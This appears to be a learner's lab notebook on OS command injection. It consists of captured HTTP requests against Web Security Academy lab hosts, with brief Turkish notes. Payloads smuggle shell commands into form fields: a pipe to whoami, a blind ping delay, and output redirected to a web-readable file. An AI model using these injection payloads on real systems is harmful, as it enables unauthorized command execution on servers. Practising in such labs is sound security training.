# OS Command İnjection

POST /product/stock HTTP/2
Host: 0aae003104c870bc8028f88c0004007c.web-security-academy.net
Cookie: session=fSpUfeKTqjgNuR5I8VTgnH5RMQsrSoy7
Content-Length: 27
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: tr-TR,tr;q=0.9
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Origin: https://0aae003104c870bc8028f88c0004007c.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aae003104c870bc8028f88c0004007c.web-security-academy.net/product?productId=4
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
 
productId=4&storeId=1|whoami


-- 

- bir submit feedback gönder

POST /feedback/submit HTTP/2
Host: 0a0a009b03c7e17082b07f5100e80039.web-security-academy.net
Cookie: session=BWm8DHMMdQj94thbQv4U3fodYL2mgw7v
Content-Length: 88
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: tr-TR,tr;q=0.9
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a0a009b03c7e17082b07f5100e80039.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0a009b03c7e17082b07f5100e80039.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
 
csrf=79Rg6FG7744BVzNqa4U0TXNMubwKHDWE&name=aa&email=x||ping+-c+10+127.0.0.1||&
subject=aa&message=aa


--


POST /feedback/submit HTTP/2
Host: 0ad800970442f41882cc47d900de001c.web-security-academy.net
Cookie: session=OEgjRiylY6EZsYy1vkbCax0zTbfcPoes
Content-Length: 88
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: tr-TR,tr;q=0.9
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ad800970442f41882cc47d900de001c.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad800970442f41882cc47d900de001c.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
 
csrf=hKhdqGFo5fbvVUk0DEP4VDGnUIHn9dLg&name=aa&email=||whoami>/var/www/images/output.txt||&subject=aa&message=aa

bir foto yükleme istedği yakalayıp filename=output.txt yapıyoruz.


--



